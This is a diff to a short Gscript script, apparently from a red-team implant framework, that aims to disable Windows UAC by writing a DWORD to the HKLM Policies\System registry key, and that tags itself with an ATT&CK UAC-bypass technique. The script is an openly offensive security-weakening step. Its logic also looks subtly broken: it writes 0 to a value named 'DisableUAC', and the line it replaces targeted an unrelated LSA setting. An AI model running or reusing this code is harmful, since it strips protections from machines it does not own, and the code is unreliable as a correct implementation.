@@ -3,7 +3,7 @@
 // Author: ahhh
 // Purpose: Disable UAC
 // Gscript version: 1.0.0
-// ATT&CK: 
+// ATT&CK: https://attack.mitre.org/wiki/Technique/T1088
 
 //priority:90
 //timeout:150
@@ -15,7 +15,7 @@ function Deploy() {
 
     var value = 0;
     // disable UAC
-    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Control\\Lsa", "lmcompatibilitylevel", value);
+    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableUAC", value);
 
     console.log("Done Disable UAC");
     return true;
